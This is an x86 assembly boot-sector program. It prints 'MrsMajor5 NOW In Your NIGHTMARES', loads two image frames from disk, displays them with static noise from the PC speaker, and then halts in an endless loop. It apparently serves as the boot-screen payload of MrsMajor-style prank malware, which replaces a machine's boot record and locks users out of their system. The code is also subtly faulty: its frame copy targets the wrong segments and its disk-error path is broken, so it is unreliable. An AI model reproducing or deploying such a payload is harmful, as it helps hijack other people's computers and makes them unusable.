[org 0x7C00]        ; Set origin to boot sector
[BITS 16]           ; 16-bit real mode

start:
    ; Initialize data segment and extra segment
    mov ax, 0x0000    ; Set data segment
    mov ds, ax
    mov es, ax

    ; Display the message
    call display_message

    ; Load frame 1 data using extended sector read
    call load_frame1_data_extended

    ; Display the first frame
    call display_frame1
    call delay_1_second
    call play_static_sound

    ; Load frame 2 data using extended sector read
    call load_frame2_data_extended

    ; Display the second frame
    call display_frame2
    call delay_1_second
    call play_static_sound

    ; Loop indefinitely
loop_forever:
    jmp loop_forever

; Extended disk read function (INT 0x13, AH=0x42)
load_frame1_data_extended:
    mov ax, 0x1000          ; Segment for the frame 1 data
    mov es, ax

    lea bx, [disk_address_packet1] ; Load address of DAP into bx
    mov si, bx              ; Load address of DAP into si
    mov ah, 0x42            ; Extended read
    int 0x13                ; BIOS interrupt
    jc disk_error           ; Jump if there's an error
    ret

load_frame2_data_extended:
    mov ax, 0x2000          ; Segment for the frame 2 data
    mov es, ax

    lea bx, [disk_address_packet2] ; Load address of DAP into bx
    mov si, bx              ; Load address of DAP into si
    mov ah, 0x42            ; Extended read
    int 0x13                ; BIOS interrupt
    jc disk_error           ; Jump if there's an error
    ret

; Disk Address Packet (DAP) for reading frame data
disk_address_packet1:
    db 0x10                 ; Size of DAP (16 bytes)
    db 0x00                 ; Reserved
    dw 128                  ; Number of sectors to read (64KB = 128 sectors)
    dw 0x0000               ; Offset in memory (0x0000)
    dw 0x1000               ; Segment in memory (0x1000 for frame 1)
    dd 0x00000002           ; LBA (starting sector number for frame 1)
    db 0x00                 ; Fill remaining bytes to make up 16 bytes
    db 0x00                 ; Fill remaining bytes to make up 16 bytes

disk_address_packet2:
    db 0x10                 ; Size of DAP (16 bytes)
    db 0x00                 ; Reserved
    dw 128                  ; Number of sectors to read (64KB = 128 sectors)
    dw 0x0000               ; Offset in memory (0x0000)
    dw 0x2000               ; Segment in memory (0x2000 for frame 2)
    dd 0x00000123           ; LBA (starting sector number for frame 2)
    db 0x00                 ; Fill remaining bytes to make up 16 bytes
    db 0x00                 ; Fill remaining bytes to make up 16 bytes

; Display the message in text mode 03h
display_message:
    mov ax, 0x03
    int 0x10          ; Set Mode 03h (80x25 text mode)
    mov si, message
    call display_text
    ret

; Display text character by character
display_text:
    mov ax, 0xB800     ; Video memory segment for text mode
    mov es, ax         ; Load segment address
    mov di, 0          ; Start from the beginning of video memory
next_char:
    lodsb              ; Load byte from [si] into al and increment si
    cmp al, 0          ; Check if end of string (null terminator)
    je done_text       ; Jump if end of string
    mov ah, 0x0F       ; Attribute for text color (white on black)
    stosw              ; Store word (character and attribute) into [di]
    jmp next_char      ; Repeat for the next character
done_text:
    ret

; Display frame 1 data (assumed to be at 0x1000)
display_frame1:
    mov ax, 0x13          ; Set Mode 13h (320x200, 256 colors)
    int 0x10              ; BIOS interrupt
    mov ax, 0x1000        ; Load the source segment for frame data into ax
    mov es, ax            ; Move segment value from ax to es
    mov di, 0x0000        ; Destination offset in video memory (0xA0000)
    mov cx, 32000         ; Number of words (320x200 pixels / 2)
    rep movsw             ; Move frame data to video memory
    ret

; Display frame 2 data (assumed to be at 0x2000)
display_frame2:
    mov ax, 0x13          ; Set Mode 13h (320x200, 256 colors)
    int 0x10              ; BIOS interrupt
    mov ax, 0x2000        ; Load the source segment for frame data into ax
    mov es, ax            ; Move segment value from ax to es
    mov di, 0x0000        ; Destination offset in video memory (0xA0000)
    mov cx, 32000         ; Number of words (320x200 pixels / 2)
    rep movsw             ; Move frame data to video memory
    ret

; Delay for approximately 1 second
delay_1_second:
    mov cx, 0xFFFF    ; Adjust loop count for timing
delay_loop:
    nop               ; No operation (just waste time)
    loop delay_loop   ; Repeat until CX is zero
    ret

; Generate static noise (PC speaker)
play_static_sound:
    mov al, 0xB6      ; Set square wave generator
    out 0x43, al
    mov al, 0xFF      ; Generate noise frequency
    out 0x42, al
    mov al, 0x03      ; Enable PC speaker
    out 0x61, al
    call delay_1_second ; Play sound for 1 second
    mov al, 0x00      ; Turn off PC speaker
    out 0x61, al
    ret

disk_error:
    ; Handle disk error here (optional)
    ret

; Message to display
message db 'MrsMajor5 NOW In Your NIGHTMARES', 0

; Fill the boot sector up to 510 bytes with 0x00
times 510-($-$$) db 0

; Boot signature
dw 0xAA55
